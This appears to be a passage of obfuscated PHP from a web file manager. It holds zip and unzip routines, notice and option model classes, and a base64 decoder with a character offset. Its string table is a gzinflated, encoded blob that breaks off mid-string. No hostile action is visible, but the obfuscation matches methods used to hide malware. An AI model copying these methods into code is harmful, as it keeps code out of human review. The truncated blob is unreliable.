$Æ¶ù¡ø[count($Æ¶ù¡ø) - 1] : $òœú˜œ[12]; } if ($Î‡ÍäøŞ === !1) { return implode($òœú˜œ[288], $Æ¶ù¡ø); } if (count($Æ¶ù¡ø) >= $¬šÃ£²ö) { $Æ¶ù¡ø = array_slice($Æ¶ù¡ø, $¬šÃ£²ö * 0.5, $¬šÃ£²ö); } $Æ¶ù¡ø[] = $Î‡ÍäøŞ; write_log($òœú˜œ[176] . ACTION . $òœú˜œ[1293] . $Î‡ÍäøŞ, $òœú˜œ[1294]); } public static function getLastError($£§µÜóî = '') { $£­Âßõ± = self::errorTips(-1); return $£­Âßõ± ? $£­Âßõ± : $£§µÜóî; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $‹é–Ï£·; if ($‹é–Ï£·) { return $‹é–Ï£·; } $™œ¨™Æ = IO::init($_SERVER[Î·Ü›öğ][8]); return $™œ¨™Æ; } private static function iconvSystem($­Åê‹Éæ) { return self::local()->iconvSystem($­Åê‹Éæ); } private static function iconvApp($Ëíª¿Ú“) { return self::local()->iconvApp($Ëíª¿Ú“); } public static function zipFolder($çÏ¡àÂ, $¼™ÖëÕŞ = "\172\x69\160", $£ÓÓ‚ã‹ = '', $“Ş÷°£§ = REPEAT_RENAME) { $çáĞ¢£Ş =& $_SERVER[Î·Ü›öğ]; $§£ƒˆ†¸ = IO::listPath($çÏ¡àÂ); if (!$§£ƒˆ†¸) { return !1; } $§£ƒˆ†¸ = array_merge($§£ƒˆ†¸[$çáĞ¢£Ş[85]], $§£ƒˆ†¸[$çáĞ¢£Ş[86]]); return self::zip($§£ƒˆ†¸, $¼™ÖëÕŞ, $£ÓÓ‚ã‹, $“Ş÷°£§); } public static function zip($„ÑÍêŠ±, $²ºÀ•¢ = "\172\151\160", $‹çüŞœ× = '', $¹Œ³îš = REPEAT_RENAME) { $©Ğò÷àã =& $_SERVER[Î·Ü›öğ]; if (is_string($„ÑÍêŠ±) && $„ÑÍêŠ±) { $„ÑÍêŠ± = array(array($©Ğò÷àã[87] => $„ÑÍêŠ±)); } $¬¾šØ = self::init($„ÑÍêŠ±[0][$©Ğò÷àã[87]]); $¤õš¨Àü = self::info($„ÑÍêŠ±[0][$©Ğò÷àã[87]]); $úÚÂ¶¢† = $©Ğò÷àã[12]; $ÎÚ’ì·¸ = $©Ğò÷àã[12]; $€çî›şì = $©Ğò÷àã[12]; if ($‹çüŞœ× && substr($‹çüŞœ×, -1, 1) != $©Ğò÷àã[8]) { $ÎÚ’ì·¸ = get_path_father($‹çüŞœ×); $€çî›şì = get_path_this($‹çüŞœ×); } else { $ÎÚ’ì·¸ = self::pathFather($¤õš¨Àü[$©Ğò÷àã[87]]); $€çî›şì = $¤õš¨Àü[$©Ğò÷àã[32]] . $©Ğò÷àã[10] . $²ºÀ•¢; if (count($„ÑÍêŠ±) > 1) { $““ß  = IO::info($ÎÚ’ì·¸); $€çî›şì = $““ß [$©Ğò÷àã[32]] . $©Ğò÷àã[10] . $²ºÀ•¢; } if ($‹çüŞœ×) { $ÎÚ’ì·¸ = $‹çüŞœ×; } } if ($¬¾šØ->getType() == $©Ğò÷àã[109]) { $°ç³çöÈ = self::init($ÎÚ’ì·¸); $Ú¤ÒìÄ = $°ç³çöÈ->getType() == $©Ğò÷àã[109] ? $ÎÚ’ì·¸ : get_path_father($¬¾šØ->path); $Ú¤ÒìÄ = IO::getPathInner($Ú¤ÒìÄ); $Ú¤ÒìÄ = rtrim($Ú¤ÒìÄ, $©Ğò÷àã[8]) . $©Ğò÷àã[8]; mk_dir($Ú¤ÒìÄ); } else { $úÚÂ¶¢† = TEMP_FILES . $©Ğò÷àã[1295] . time() . rand_string(8) . $©Ğò÷àã[8]; mk_dir($úÚÂ¶¢†); file_put_contents($úÚÂ¶¢† . $©Ğò÷àã[1296], $©Ğò÷àã[12]); $Ú¤ÒìÄ = $úÚÂ¶¢†; } $ı»ÏŠˆ = IO::info($Ú¤ÒìÄ); if (!$ı»ÏŠˆ || !$ı»ÏŠˆ[$©Ğò÷àã[236]]) { show_json(LNG($©Ğò÷àã[1297]), !1); } $Íò…Úü = self::zipFileList($„ÑÍêŠ±, $úÚÂ¶¢†); foreach ($Íò…Úü as $®Ö‰ŞŠ => $œÔŞƒˆ) { $Íò…Úü[$®Ö‰ŞŠ] = self::iconvSystem($œÔŞƒˆ); } $°‰š«ıó = get_filename_auto($Ú¤ÒìÄ . $€çî›şì, $©Ğò÷àã[12], $¹Œ³îš); KodArchive::create(self::iconvSystem($°‰š«ıó), $Íò…Úü); if (!IO::exist($°‰š«ıó)) { if ($úÚÂ¶¢†) { del_dir($úÚÂ¶¢†); } write_log($©Ğò÷àã[1298] . $°‰š«ıó, $©Ğò÷àã[390]); show_json(LNG($©Ğò÷àã[1299]), !1); } if (!$úÚÂ¶¢†) { return $°‰š«ıó; } $ì¼Ù­¢¦ = self::move($°‰š«ıó, $ÎÚ’ì·¸, $¹Œ³îš); if ($úÚÂ¶¢†) { del_dir($úÚÂ¶¢†); } if (!$°‰š«ıó) { write_log($©Ğò÷àã[1300] . $°‰š«ıó . $©Ğò÷àã[1301] . $ÎÚ’ì·¸, $©Ğò÷àã[390]); show_json(LNG($©Ğò÷àã[1299]), !1); } return $ì¼Ù­¢¦; } public static function unzip($ä‡ƒ§²Á, $İ©û×ìæ, $‹´Ÿ¼à = "\55\61", $´†…Öá³ = "\x72\145\x70\154\x61\143\145") { $áŠ÷ûõ» =& $_SERVER[Î·Ü›öğ]; $³±¬â›Š = parent::info($ä‡ƒ§²Á); if (!$³±¬â›Š) { show_json(LNG($áŠ÷ûõ»[1302]), !1); } $º×ÑØ’© = IO::infoFullSimple($İ©û×ìæ); if (!$º×ÑØ’©) { $İ©û×ìæ = IO::mkdir($İ©û×ìæ); } if (isset($º×ÑØ’©[$áŠ÷ûõ»[194]]) && trim($º×ÑØ’©[$áŠ÷ûõ»[87]], $áŠ÷ûõ»[8]) != trim($İ©û×ìæ, $áŠ÷ûõ»[8])) { $ƒØ´÷ßÃ = KodIO::make($º×ÑØ’©[$áŠ÷ûõ»[193]]); $ÄœÆ¶Ëš = IO::fileNameAuto($ƒØ´÷ßÃ, $º×ÑØ’©[$áŠ÷ûõ»[32]], REPEAT_RENAME_FOLDER, !0); $İ©û×ìæ = IO::mkdir($ƒØ´÷ßÃ . $ÄœÆ¶Ëš); } $‹´Ÿ¼à = $‹´Ÿ¼à && $‹´Ÿ¼à != $áŠ÷ûõ»[1303] ? @json_decode($‹´Ÿ¼à, !0) : -1; $±öŞæ¹® = self::unzipPart($ä‡ƒ§²Á, $‹´Ÿ¼à); if (!$±öŞæ¹® || !IO::exist($±öŞæ¹®[$áŠ÷ûõ»[233]])) { show_json(LNG($áŠ÷ûõ»[108]), !1); } $‹›Œƒû = $±öŞæ¹®[$áŠ÷ûõ»[1304]][count($±öŞæ¹®[$áŠ÷ûõ»[1304]]) - 1]; if ($‹›Œƒû[$áŠ÷ûõ»[1305]] == -1 || substr($‹›Œƒû[$áŠ÷ûõ»[32]], -1, 1) == $áŠ÷ûõ»[8]) { $öİ©É–€ = $±öŞæ¹®[$áŠ÷ûõ»[1306]] . rand_string(10) . $áŠ÷ûõ»[8]; mk_dir($öİ©É–€); $”‚î°¡ = count($±öŞæ¹®[$áŠ÷ûõ»[1304]]) == 1 ? IO::ext($ä‡ƒ§²Á) : get_path_ext($±öŞæ¹®[$áŠ÷ûõ»[233]]); $Ïõ€ŸïÕ = KodArchive::extract(self::iconvSystem($±öŞæ¹®[$áŠ÷ûõ»[233]]), $öİ©É–€, $‹›Œƒû[$áŠ÷ûõ»[1305]], $ÄœÆ¶Ëš, $”‚î°¡); self::unzipErrorCheck($Ïõ€ŸïÕ, array($áŠ÷ûõ»[1307], $ä‡ƒ§²Á, $”‚î°¡, $İ©û×ìæ, $±öŞæ¹®)); Hook::trigger($áŠ÷ûõ»[1308], $öİ©É–€); recursion_dir($öİ©É–€, $øäøºï, $ûáş½Âª, 0); $òù‡ş¶ = array_merge($øäøºï, $ûáş½Âª); $½¯ÚèßÂ = array(); foreach ($òù‡ş¶ as $•üÂ) { $ºıåªûÖ = IO::move(self::iconvApp($•üÂ), $İ©û×ìæ, $´†…Öá³); if ($ºıåªûÖ) { $½¯ÚèßÂ[] = $ºıåªûÖ; } } del_dir($öİ©É–€); } else { $ºıåªûÖ = IO::move($±öŞæ¹®[$áŠ÷ûõ»[233]], $İ©û×ìæ, $´†…Öá³, get_path_this($‹›Œƒû[$áŠ÷ûõ»[32]])); if ($ºıåªûÖ) { $½¯ÚèßÂ[] = $ºıåªûÖ; } } return $½¯ÚèßÂ ? $½¯ÚèßÂ : !1; } public static function unzipList($´ú–ª¶) { $¡ª¥Øí‚ =& $_SERVER[Î·Ü›öğ]; $—–¸Ö½¬ = isset($´ú–ª¶[$¡ª¥Øí‚[1309]]) ? $´ú–ª¶[$¡ª¥Øí‚[1309]] : !1; $Å¨°âÜ÷ = isset($´ú–ª¶[$¡ª¥Øí‚[1305]]) ? @json_decode($´ú–ª¶[$¡ª¥Øí‚[1305]], !0) : -1; $ÇÍ°ŒŒµ = self::unzipPart($´ú–ª¶[$¡ª¥Øí‚[87]], $Å¨°âÜ÷); if (!$ÇÍ°ŒŒµ || !IO::exist($ÇÍ°ŒŒµ[$¡ª¥Øí‚[233]])) { show_json(LNG($¡ª¥Øí‚[108]), !1); } $û¾Ÿã² = $ÇÍ°ŒŒµ[$¡ª¥Øí‚[1304]][count($ÇÍ°ŒŒµ[$¡ª¥Øí‚[1304]]) - 1]; $ËêÓ­ = in_array(IO::ext($ÇÍ°ŒŒµ[$¡ª¥Øí‚[233]]), array($¡ª¥Øí‚[390], $¡ª¥Øí‚[1310], $¡ª¥Øí‚[1311], $¡ª¥Øí‚[1312], $¡ª¥Øí‚[1313], $¡ª¥Øí‚[1314])); if (!$—–¸Ö½¬ && ($û¾Ÿã²[$¡ª¥Øí‚[1305]] == -1 || $ËêÓ­)) { $æ£µ³„û = $ÇÍ°ŒŒµ[$¡ª¥Øí‚[1306]] . get_path_this($ÇÍ°ŒŒµ[$¡ª¥Øí‚[233]]) . $¡ª¥Øí‚[1315]; if (!IO::exist($æ£µ³„û)) { $·Õ×ßô = $û¾Ÿã²[$¡ª¥Øí‚[1305]] == -1 ? get_path_ext(IO::pathThis($´ú–ª¶[$¡ª¥Øí‚[87]])) : get_path_ext($ÇÍ°ŒŒµ[$¡ª¥Øí‚[233]]); $Ö§ò˜Ó– = KodArchive::listContent(self::iconvSystem($ÇÍ°ŒŒµ[$¡ª¥Øí‚[233]]), !0, $·Õ×ßô); self::unzipErrorCheck($Ö§ò˜Ó–, array($¡ª¥Øí‚[1316], $´ú–ª¶, $ÇÍ°ŒŒµ)); @file_put_contents($æ£µ³„û, json_encode($Ö§ò˜Ó–[$¡ª¥Øí‚[1317]])); } return @json_decode(IO::getContent($æ£µ³„û), !0); } IO::fileOut($ÇÍ°ŒŒµ[$¡ª¥Øí‚[233]], $—–¸Ö½¬, get_path_this($û¾Ÿã²[$¡ª¥Øí‚[32]])); die; } private static function zipFileList($‹à°›Óî, $¯•‚Éôå = false) { $€»­ç¯Å =& $_SERVER[Î·Ü›öğ]; $¥’¤÷÷š = array(); foreach ($‹à°›Óî as $¬½âúúÅ) { $é¡ÄÕÎ¯ = $¬½âúúÅ[$€»­ç¯Å[87]]; if ($¯•‚Éôå) { $é¡ÄÕÎ¯ = self::copy($¬½âúúÅ[$€»­ç¯Å[87]], $¯•‚Éôå, $€»­ç¯Å[916]); } else { $Á£ùÂ¾ = self::init($¬½âúúÅ[$€»­ç¯Å[87]]); if ($Á£ùÂ¾->getType() == $€»­ç¯Å[109]) { $é¡ÄÕÎ¯ = $Á£ùÂ¾->path; } } if ($é¡ÄÕÎ¯ && self::local()->exist($é¡ÄÕÎ¯)) { $¥’¤÷÷š[$¬½âúúÅ[$€»­ç¯Å[87]]] = $é¡ÄÕÎ¯; } } if (!empty($¥’¤÷÷š)) { return array_values($¥’¤÷÷š); } show_json(LNG($€»­ç¯Å[1274]), !1); } private static function localFilePath($’¹À‡“£) { $³´Øï¥ =& $_SERVER[Î·Ü›öğ]; $±‰’éÃô = KodIO::parse($’¹À‡“£); if ($±‰’éÃô[$³´Øï¥[33]] == KodIO::KOD_SOURCE) { $æ•ŒË = Model($³´Øï¥[922])->fileInfoGet(KodIO::sourceID($’¹À‡“£)); if (!$æ•ŒË[$³´Øï¥[87]]) { show_json($³´Øï¥[1318], !1); } $’¹À‡“£ = $æ•ŒË[$³´Øï¥[87]]; } $Çû¼âêÑ = self::init($’¹À‡“£); if ($Çû¼âêÑ->pathParse[$³´Øï¥[1260]]) { $’¹À‡“£ = $Çû¼âêÑ->pathParse[$³´Øï¥[1260]]; $Çû¼âêÑ = self::init($’¹À‡“£); } $ïì§È—û = $Çû¼âêÑ->getType(); if ($ïì§È—û == $³´Øï¥[109] || $ïì§È—û == $³´Øï¥[1319]) { if (!$Çû¼âêÑ->exist($Çû¼âêÑ->path)) { show_json(LNG($³´Øï¥[108]), !1); } return $Çû¼âêÑ->path; } return !1; } public static function unzipPart($ˆ¢Ÿ¶‹, $‘Äô´³  = -1) { $–øå®ÈÁ =& $_SERVER[Î·Ü›öğ]; $Ä©ù´Ô = IO::pathThis($ˆ¢Ÿ¶‹); if (!$‘Äô´³  || $‘Äô´³  == -1) { $óÖÖ¥º = array(array($–øå®ÈÁ[32] => $Ä©ù´Ô, $–øå®ÈÁ[1305] => -1)); $óÖÖ¥º[0][$–øå®ÈÁ[1320]] = $óÖÖ¥º[0][$–øå®ÈÁ[32]]; } else { if (is_array($‘Äô´³ )) { $óÖÖ¥º = $‘Äô´³ ; $—ó¬èà… = count($óÖÖ¥º) - 1; for ($ú«‹š® = 0; $ú«‹š® <= $—ó¬èà…; $ú«‹š®++) { $è÷Ÿæò = $óÖÖ¥º[$ú«‹š®]; $ÖÛŒæ×¾ = get_path_this($è÷Ÿæò[$–øå®ÈÁ[32]]) . (checkExtSafe($è÷Ÿæò[$–øå®ÈÁ[32]]) ? $–øå®ÈÁ[12] : $–øå®ÈÁ[1321]); $óÖÖ¥º[$ú«‹š®][$–øå®ÈÁ[1320]] = $–øå®ÈÁ[1322] . intval($è÷Ÿæò[$–øå®ÈÁ[1305]]) . $–øå®ÈÁ[464] . $ÖÛŒæ×¾; if ($ú«‹š® == 0) { continue; } $óÖÖ¥º[$ú«‹š®][$–øå®ÈÁ[1320]] = $óÖÖ¥º[$ú«‹š® - 1][$–øå®ÈÁ[1320]] . $–øå®ÈÁ[1323] . $óÖÖ¥º[$ú«‹š®][$–øå®ÈÁ[1320]]; } } } if (!is_array($óÖÖ¥º) || count($óÖÖ¥º) == 0) { return !1; } $Ó¬ ˜Ğœ = $óÖÖ¥º[count($óÖÖ¥º) - 1]; if (!IO::exist($ˆ¢Ÿ¶‹)) { return !1; } $•Æöæ¹€ = TEMP_FILES . $–øå®ÈÁ[1324] . kodIO::hashPathSafe($ˆ¢Ÿ¶‹) . $–øå®ÈÁ[8]; $ÙœòŒş³ = $•Æöæ¹€ . $Ó¬ ˜Ğœ[$–øå®ÈÁ[1320]]; mk_dir($•Æöæ¹€); file_put_contents(TEMP_FILES . $–øå®ÈÁ[1296], $–øå®ÈÁ[12]); if (IO::exist($ÙœòŒş³)) { return array($–øå®ÈÁ[233] => $ÙœòŒş³, $–øå®ÈÁ[1304] => $óÖÖ¥º, $–øå®ÈÁ[1306] => $•Æöæ¹€); } $çŞ‰·»ù = self::localFilePath($ˆ¢Ÿ¶‹); if (!$çŞ‰·»ù) { $çŞ‰·»ù = $•Æöæ¹€ . $–øå®ÈÁ[1325]; if (!IO::exist($çŞ‰·»ù)) { self::copy($ˆ¢Ÿ¶‹, $•Æöæ¹€, !1, get_path_this($çŞ‰·»ù)); } } if (!$çŞ‰·»ù || !IO::exist($çŞ‰·»ù)) { return !1; } if ($Ó¬ ˜Ğœ[$–øå®ÈÁ[1305]] == -1) { return array($–øå®ÈÁ[233] => $çŞ‰·»ù, $–øå®ÈÁ[1304] => $óÖÖ¥º, $–øå®ÈÁ[1306] => $•Æöæ¹€); } $ß·©Ôı = $çŞ‰·»ù; foreach ($óÖÖ¥º as $ú«‹š® => $è÷Ÿæò) { if (!$è÷Ÿæò || $è÷Ÿæò[$–øå®ÈÁ[1305]] == $–øå®ÈÁ[1303]) { break; } if (substr($è÷Ÿæò[$–øå®ÈÁ[32]], -1, 1) == $–øå®ÈÁ[8]) { break; } $‚³©å¡ = in_array(get_path_ext($è÷Ÿæò[$–øå®ÈÁ[1320]]), array($–øå®ÈÁ[390], $–øå®ÈÁ[1310], $–øå®ÈÁ[1311], $–øå®ÈÁ[1312], $–øå®ÈÁ[1313], $–øå®ÈÁ[1314])); $ó¯ªİ¥’ = $ú«‹š® == count($óÖÖ¥º) - 1 && $‚³©å¡; $†‚êñ¸Ü = $•Æöæ¹€ . $è÷Ÿæò[$–øå®ÈÁ[1320]]; $»ºöô€ö = $•Æöæ¹€ . get_path_this($è÷Ÿæò[$–øå®ÈÁ[32]]); if (IO::exist($†‚êñ¸Ü)) { $ß·©Ôı = $†‚êñ¸Ü; continue; } $ò€æ’ß¥ = $ú«‹š® == 0 ? get_path_ext($Ä©ù´Ô) : get_path_ext($ß·©Ôı); $ïù¢êìÇ = KodArchive::extract(self::iconvSystem($ß·©Ôı), $•Æöæ¹€, $è÷Ÿæò[$–øå®ÈÁ[1305]], $“ò­Á, $ò€æ’ß¥); self::unzipErrorCheck($ïù¢êìÇ, array($–øå®ÈÁ[1326], $ˆ¢Ÿ¶‹, $óÖÖ¥º, $è÷Ÿæò, $†‚êñ¸Ü)); if (IO::exist($»ºöô€ö)) { IO::rename($»ºöô€ö, get_path_this($†‚êñ¸Ü)); } $ß·©Ôı = $†‚êñ¸Ü; } $ÙœòŒş³ = $ß·©Ôı; return array($–øå®ÈÁ[233] => $ß·©Ôı, $–øå®ÈÁ[1304] => $óÖÖ¥º, $–øå®ÈÁ[1306] => $•Æöæ¹€); } private static function unzipErrorCheck($ºÃàó¢œ, $¸á¾‹È¶ = false) { $­Óœò¦’ =& $_SERVER[Î·Ü›öğ]; if ($ºÃàó¢œ[$­Óœò¦’[1327]]) { return !0; } write_log(array($­Óœò¦’[1328], $ºÃàó¢œ, $¸á¾‹È¶), $­Óœò¦’[1329]); $˜·îâ´ä = is_array($ºÃàó¢œ[$­Óœò¦’[1317]]) ? json_encode($ºÃàó¢œ[$­Óœò¦’[1317]]) : $ºÃàó¢œ[$­Óœò¦’[1317]]; show_json($­Óœò¦’[1330] . $˜·îâ´ä, !1); die; } } goto e¾”ï˜À‚”; f¸ó«ì·À: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\156\157\164\151\143\x65\x4c\x69\x73\164"; public $field = array("\x6e\x61\155\145", "\x63\x6f\156\x74\x65\156\164", "\x61\x75\x74\150", "\x6d\157\x64\x65", "\x74\151\x6d\145", "\x74\x79\x70\145", "\154\145\x76\145\154", "\x65\156\x61\x62\x6c\x65", "\x73\x6f\x72\x74"); public function listData($°‘ñÕ¦¼ = false, $ÅÆºÛÂ¯ = "\163\157\162\x74", $ùœüŞ®ş = false) { return parent::listData($°‘ñÕ¦¼, $ÅÆºÛÂ¯, $ùœüŞ®ş); } public function add($•Ö²ùÁ) { $½ «¹± =& $_SERVER[Î·Ü›öğ]; $Ğ¿ÖÖå = time(); if ($•Ö²ùÁ[$½ «¹±[16]] == $½ «¹±[2499]) { $Ğ¿ÖÖå = strtotime($•Ö²ùÁ[$½ «¹±[207]]); } $•Ö²ùÁ[$½ «¹±[207]] = $Ğ¿ÖÖå; return parent::insert($•Ö²ùÁ); } public function update($¤ÍÑÔÛú, $Œ´Â„ÊÜ) { $óÂæ“˜§ =& $_SERVER[Î·Ü›öğ]; $¼õı¨ñÅ = $this->listData($¤ÍÑÔÛú); if (!$¼õı¨ñÅ) { return !1; } $ó÷åäÔ = time(); if ($Œ´Â„ÊÜ[$óÂæ“˜§[16]] == $óÂæ“˜§[2499]) { $ó÷åäÔ = strtotime($Œ´Â„ÊÜ[$óÂæ“˜§[207]]); } $Œ´Â„ÊÜ[$óÂæ“˜§[207]] = $ó÷åäÔ; return parent::update($¤ÍÑÔÛú, $Œ´Â„ÊÜ); } public function remove($èçÔüÅ¥) { $Ğ ä¹ú¸ = $this->listData($èçÔüÅ¥); if (!$Ğ ä¹ú¸ || $Ğ ä¹ú¸[$_SERVER[Î·Ü›öğ][192]]) { return !1; } return parent::remove($èçÔüÅ¥); } public function sort($ÇõÌÖŸ£, $™¡‚—ÚË) { return parent::update($ÇõÌÖŸ£, $™¡‚—ÚË); } public function enable($´‰¸õî, $şüà¡“®) { return parent::update($´‰¸õî, array($_SERVER[Î·Ü›öğ][2500] => $şüà¡“®)); } private function initUserOption() { $³ÒÖ† =& $_SERVER[Î·Ü›öğ]; $this->optionType = $³ÒÖ†[2501]; $this->modelType = $³ÒÖ†[2502]; $this->field = array($³ÒÖ†[2503], $³ÒÖ†[32], $³ÒÖ†[207], $³ÒÖ†[33], $³ÒÖ†[2504], $³ÒÖ†[839], $³ÒÖ†[229]); } public function userNoticeGet($ ·æ÷™À = false) { $this->initUserOption(); return parent::listData($ ·æ÷™À, $_SERVER[Î·Ü›öğ][477], !0); } public function userNoticeAdd($ÎÓò¬°) { $·Ä«Œ™ =& $_SERVER[Î·Ü›öğ]; $this->initUserOption(); $°µªÔÛ– = $this->findByKey($·Ä«Œ™[2503], $ÎÓò¬°[$·Ä«Œ™[477]]); if ($°µªÔÛ–) { return !0; } $Ü•¤‚„è = array($·Ä«Œ™[2503] => $ÎÓò¬°[$·Ä«Œ™[477]], $·Ä«Œ™[32] => $ÎÓò¬°[$·Ä«Œ™[32]], $·Ä«Œ™[207] => $ÎÓò¬°[$·Ä«Œ™[207]], $·Ä«Œ™[33] => isset($ÎÓò¬°[$·Ä«Œ™[33]]) ? $ÎÓò¬°[$·Ä«Œ™[33]] : 1, $·Ä«Œ™[2504] => isset($ÎÓò¬°[$·Ä«Œ™[2504]]) ? $ÎÓò¬°[$·Ä«Œ™[2504]] : 0, $·Ä«Œ™[839] => 0, $·Ä«Œ™[229] => 0); return parent::insert($Ü•¤‚„è); } public function userNoticeEdit($ ¬Ş«´Ò, $ØªÛ®É…) { $this->initUserOption(); return parent::update($ ¬Ş«´Ò, $ØªÛ®É…); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\145\155\137\157\160\164\151\x6f\x6e"; protected $jsonField = array("\155\x65\x6e\165", "\x72\157\154\x65", "\x72\157\x6c\x65\107\162\157\165\160", "\x72\x65\147\151\163\x74", "\145\x6d\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($«˜½ÕÔƒ) { return "\x53\171\163\x74\x65\x6d\x4f\160\x74\151\x6f\x6e\137{$«˜½ÕÔƒ}"; } protected function optionDefault($úË¾¬§´ = '') { $“©Ë© =& $_SERVER[Î·Ü›öğ]; if ($úË¾¬§´ == $“©Ë©[12]) { return $GLOBALS[$“©Ë©[6]][$“©Ë©[459]]; } } } class SystemRecordModel extends ModelBaseLight { } goto d‡ˆ‹ğË®; bØÏìå«øì: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\316\267\334\233\366\360", "\374\222\226\247\363\327"); $_SERVER[Î·Ü›öğ] = explode("\x7c\x3\x7c\x1\x7c\x5", gzinflate(substr(strrev('ÖÆ–2fØ²d‘–È‹l²È\'»;bÑ;bCJ=ô…¥'."\n".'–ZP0µÕx	}Å'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹')."\330\222\106\326\214\274\45\141\11\4\12\41\41\141\51\73\204\6\132\50\45\11\113\41\145\55\224\322\327\102\241\245\320\7\257\5\112\210\235\260\225\226\76\266\102\341\277\313\271\313\214\144\170".base64_decode('//f+7/vzJdHd595zzz333HPPOXfnnz/58Pd3rP3S2gPXfnnXOZe98oNbaHjtQej3KzT83Y0=').base64_decode('hx5A/hyz8aKqqtZ5h89q/9ol99yh/VjboW2MRp58KnzE0z85NTS5/cmxyQMPeHzdpYF6VJg=')."\xd6\xad\xa7\x3f\x4a\xce\xb4\x15\x7d\xd4\xb0\x6c\x8b\x26\x24\xcd\x5c\x9f\xd1\x4f\xc3\x46\x8e\xfe\xfa\xe9\x4f\x67\x2c\x52\xd0\xb3\xa6\xad\xd3\xa8\x8f\xfe\xa8\xd0\x2f\xf2\xbf\x35\x94\x31\x58\xbe\xda\x1e\x4d\xa8\xf1"."\316\216\216\120\54\1\205\352\345\374\254\231\202\120\136\53\150\131\370\176\136\57\130\250\67\162\163\152\336\314\353\71\107\212\110\110\151\266\326\253\131\320\122\123\243\332\24\352\210\104\127\252\211"."\225\35\41\50\321\253\16\25\365\302\30\215\221\140\334\326\12\166\302\310\352\274\304\110\201\367\253\61\324\22\156\127\22\261\100\173\74\20\114\204\243\355\64\71\30\155\153\13\47\112\323\143\321"."\x48\xa4\x31\x10\x5c\x56\x9a\xd3\x11\xb\xb4\xb4\x5\x14\xd4\xbf\x8c\xae\x1a\xb9\x3e\xb3\x4a\x59\x4d\x73\x56\x2b\xd5\x34\xd0\x6c\xe8\x99\x14\xd\xe6\x34\xd6\x1d\x7b\x2c\xf\xa1\x4\xf\xa1\x69\xca\x15\x33\x19\x1a"."\151\347\241\224\336\247\25\63\0\255\46\71\222\57\30\131\215\15\172\231\76\306\123\151\100\53\332\246\221\113\322\110\150\324\56\150\42\35\365\65\211\46\132\317\101\123\361\120\44\24\114\50\270".base64_decode('g0pzLNqmwCRkNcvWC8ry1lAspOBON1SSsVYqgC/tCBRKIBJRpmrB1rN51gytU6axaKwpFFM=')."\32\127\52\2\102\111\63\233\65\163\76\324\12\232\111\133\352\152\50\26\243\1\17\240\167\44\214\47\15\42\321\346\346\170\210\307\140\160\247\105\120\117\146\3\176\72\142\251\276\214\255\16\153"."\231\42\103\323\101\372\133\11\77\360\153\132\200\272\103\106\316\50\2\232\102\23\246\311\227\25\4\212\254\264\316\122\364\24\4\262\250\276\11\365\172\41\255\227\225\32\140\1\3\255\320\141\32".strrev('Lš<"åf/oFF}”aÆ2ØX¤ÌÏ¼h@ÁStìÔ|/`äe3IsÕ[éç^ıABXl')."\33\231\124\201\55\275\317\53\111\243\21\276\222\161\131\21\313\243\236\160\42\140\364\215\211\245\210\313\165\360\134\313\54\26\222\172\30\55\35\32\257\205\144\335\266\321\340\30\100\314\316\174\306".base64_decode('1FJxvcCHZpjNqKFo0ZYTi6RYs1nINiGiIae1oWVjiMRBtlxSErT8VV3neD/t6ToF/VcNFLE=')."\x1b\xfa\x93\xd6\x33\x19\x55\x1f\xd5\x61\x3d\x65\x53\x73\x2d\x6\x8\xbf\xd5\x6b\xe4\xfc\x28\x85\x46\xc3\x51\x35\xad\x59\xe9\xb6\xd4\x5c\x95\xd4\x62\x84\x36\xa5\x8f\xfa\xf2\xe9\x3c\x2c\x76\xbe\xbe\xbb\x1d\xf8\x8e"."\301\326\156\332\41\211\134\147\314\244\226\221\207\102\303\151\333\316\307\365\134\12\103\1\206\142\216\344\10\224\362\272\16\205\232\74\112\112\151\123\126\52\255\365\106\275\305\52\146\63\74\304\106"."\307\323\54\236\150\217\262\251\114\365\1\246\262\335\242\2\76\150\130\204\360\211\125\253\345\363\31\43\251\331\206\231\363\233\111\133\267\275\226\135\320\65\150\61\220\114\352\226\345\15\232\71\273"."\140\146\274\201\114\306\34\361\106\13\106\277\221\253\127\146\2\15\106\231\150\255\173\61\135\254\207\5\134\261\110\301\110\203\77\63\263\241\150\367\171\27\260\205\311\113\27\264\234\325\247\27\274"."\41\130\25\365\12\352\54\47\216\254\130\223\141\345\115\313\300\335\253\127\64\333\326\222\151\114\130\104\363\15\237\123\336\310\145\214\234\136\132\26\65\242\173\73\12\132\177\126\253\127\362\305\136".base64_decode('BABYjJCWxCXkwgCAeiWrjXq1ftZSaDRvFHSLjVppaUsARvV52/AiMvSUN44oNzQ2u2aOgnA=').base64_decode('RWF5NLU1kehQw81oa24PqW2BRLAVWre1ftZ0BNFj3iRLXOFFiwljUzsanEjsMEf0Avpw41g=')."\275\62\150\246\172\315\121\37\313\302\205\343\210\252\260\302\170\176\363\266\67\246\345\372\361\60\172\307\154\335\162\323\245\106\264\221\373\372\350\312\365\365\352\175\146\1\106\143\15\367\73\201\37"."\xd1\x73\xfd\x76\x9a\xb5\x1d\xf\xc5\x4e\xf\xc5\xd4\x78\xb4\x39\xb1\x3c\x10\x83\x7d\x3f\x87\x30\x67\x94\xf5\x6\x7f\x3d\xe3\x8d\xe9\x29\x4\xc4\xa4\xcd\xea\x69\x79\x1\xfd\x15\x5e\xbc\x60\xf0\xc7\x59\x2e\x5e\x44"."\54\57\22\156\301\260\153\362\132\250\220\127\56\305\332\216\30\131\3\17\317\346\71\4\330\210\51\150\201\16\371\311\230\33\272\255\231\125\335\251\131\325\136\364\377\314\352\256\356\46\337\314\236"."\xa5\x7e\x43\xd4\xf1\xd7\xfa\x6a\x95\xba\x9a\x79\x4a\x7\xe2\x52\xc\x2d\xa3\xc0\xa0\x4b\x4a\xd4\x28\xd1\x65\x4e\xb0\x8\xc\xcf\x99\x39\xbd\xec\xc2\x42\x88\x64\x5a\xba\xb7\x55\xd7\x10\x81\x46\x13\xe1\x98\x17\xf"."\373\26\215\177\16\164\361\76\51\321\22\327\274\320\304\130\